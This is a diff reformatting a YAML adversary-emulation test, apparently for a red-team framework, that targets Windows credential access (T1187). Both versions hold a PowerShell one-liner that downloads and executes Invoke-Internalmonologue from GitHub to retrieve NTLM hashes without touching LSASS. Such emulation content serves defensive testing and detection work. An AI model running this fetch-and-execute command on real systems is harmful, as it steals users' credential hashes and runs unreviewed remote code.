@@ -1,13 +1,15 @@
-- id: 52764601-d006-5fa0-951a-45f27c8aa2e0
+- requirements: []
   name: Soumaia ART Tests - WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
   description: PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn
   tactic: credential-access
-  technique:
-    attack_id: T1187
-    name: Forced Authentication
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
-          Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
+  technique_id: T1187
+  technique_name: Forced Authentication
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
+  id: 52764601-d006-5fa0-951a-45f27c8aa2e0
